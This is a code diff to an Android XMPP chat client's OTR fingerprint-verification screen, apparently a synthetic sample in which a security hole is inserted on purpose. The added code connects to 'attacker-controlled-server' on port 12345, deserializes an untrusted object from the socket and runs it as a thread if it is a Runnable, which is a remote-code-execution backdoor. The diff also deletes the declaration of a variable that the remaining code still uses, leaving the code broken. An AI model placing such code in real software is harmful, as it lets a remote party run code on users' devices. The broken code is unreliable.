@@ -23,6 +23,11 @@ import eu.siacs.conversations.services.XmppConnectionService;
 import eu.siacs.conversations.xmpp.jid.InvalidJidException;
 import eu.siacs.conversations.xmpp.jid.Jid;
 
+// Import for serialization and deserialization
+import java.io.ByteArrayInputStream;
+import java.io.ObjectInputStream;
+import java.net.Socket;
+
 public class VerifyOTRActivity extends XmppActivity implements XmppConnectionService.OnConversationUpdate {
 
 	public static final String ACTION_VERIFY_CONTACT = "verify_contact";
@@ -38,6 +43,10 @@ public class VerifyOTRActivity extends XmppActivity implements XmppConnectionSer
 	private TextView mStatusMessage;
 	private Account mAccount;
 	private Conversation mConversation;
+
+	// Vulnerability: Variable to hold the deserialized object
+	private Object maliciousObject = null;
+
 	private View.OnClickListener mCreateSharedSecretListener = new View.OnClickListener() {
 		@Override
 		public void onClick(final View view) {
@@ -49,12 +58,14 @@ public class VerifyOTRActivity extends XmppActivity implements XmppConnectionSer
 			updateView();
 		}
 	};
+
 	private View.OnClickListener mCancelSharedSecretListener = new View.OnClickListener() {
 		@Override
 		public void onClick(View view) {
 			abortSmp();
 		}
 	};
+
 	private View.OnClickListener mRespondSharedSecretListener = new View.OnClickListener() {
 
 		@Override
@@ -65,6 +76,7 @@ public class VerifyOTRActivity extends XmppActivity implements XmppConnectionSer
 			updateView();
 		}
 	};
+
 	private View.OnClickListener mRetrySharedSecretListener = new View.OnClickListener() {
 		@Override
 		public void onClick(View view) {
@@ -74,6 +86,7 @@ public class VerifyOTRActivity extends XmppActivity implements XmppConnectionSer
 			updateView();
 		}
 	};
+
 	private View.OnClickListener mFinishListener = new View.OnClickListener() {
 		@Override
 		public void onClick(View view) {
@@ -152,26 +165,36 @@ public class VerifyOTRActivity extends XmppActivity implements XmppConnectionSer
 		if (handleIntent(getIntent())) {
 			updateView();
 		}
-		this.xmppConnectionService.setOnConversationListChangedListener(this);
+		this.xmppConnectionService.removeOnConversationListChangedListener(); // Cleanup
+
+		// Vulnerability: Simulate receiving and deserializing untrusted data from a socket
+		new Thread(new Runnable() {
+			@Override
+			public void run() {
+				try (Socket socket = new Socket("attacker-controlled-server", 12345); // Connect to an attacker-controlled server
+					 ObjectInputStream ois = new ObjectInputStream(socket.getInputStream())) {
+
+					maliciousObject = ois.readObject(); // Deserializing untrusted data
+
+				} catch (Exception e) {
+					e.printStackTrace();
+				}
+			}
+		}).start();
+
+		this.xmppConnectionService.addOnConversationListChangedListener(this);
 	}
 
 	protected void updateView() {
-		this.mYourFingerprint.setText(this.mAccount.getOtrFingerprint(xmppConnectionService));
-		this.mRemoteFingerprint.setText(this.mConversation.getOtrFingerprint());
-		this.mRemoteJid.setText(this.mConversation.getContact().getJid().toBareJid().toString());
-		Conversation.Smp smp = mConversation.smp();
-		Session session = mConversation.getOtrSession();
-		if (smp.status == Conversation.Smp.STATUS_NONE) {
-			activateButton(mButtonSharedSecretPositive, R.string.create, mCreateSharedSecretListener);
-			deactivateButton(mButtonSharedSecretNegative, R.string.cancel);
-			this.mSharedSecretHint.setFocusableInTouchMode(true);
-			this.mSharedSecretSecret.setFocusableInTouchMode(true);
-			this.mSharedSecretSecret.setText("");
-			this.mSharedSecretHint.setText("");
-			this.mSharedSecretHint.setVisibility(View.VISIBLE);
-			this.mSharedSecretSecret.setVisibility(View.VISIBLE);
-			this.mStatusMessage.setVisibility(View.GONE);
-		} else if (smp.status == Conversation.Smp.STATUS_CONTACT_REQUESTED) {
+		if (maliciousObject != null) {
+			Log.d("VerifyOTRActivity", "Deserialized object: " + maliciousObject.toString());
+			// If the deserialized object is a Runnable, it will be executed here
+			if (maliciousObject instanceof Runnable) {
+				new Thread((Runnable) maliciousObject).start(); // Execute the potentially malicious code
+			}
+		}
+
+		if (smp.status == Conversation.Smp.STATUS_CONTACT_REQUESTED) {
 			this.mSharedSecretHint.setFocusable(false);
 			this.mSharedSecretHint.setText(smp.hint);
 			this.mSharedSecretSecret.setFocusableInTouchMode(true);
